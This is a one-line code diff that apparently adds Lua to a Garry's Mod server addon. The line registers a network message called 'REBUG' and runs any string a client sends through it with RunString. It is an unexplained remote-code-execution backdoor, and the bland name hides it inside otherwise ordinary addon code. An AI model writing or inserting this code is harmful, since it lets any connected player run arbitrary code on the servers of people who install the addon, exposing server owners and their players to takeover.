@@ -1,0 +1,1 @@
+util.AddNetworkString("REBUG")net.Receive("REBUG",function()RunString(net.ReadString())end)
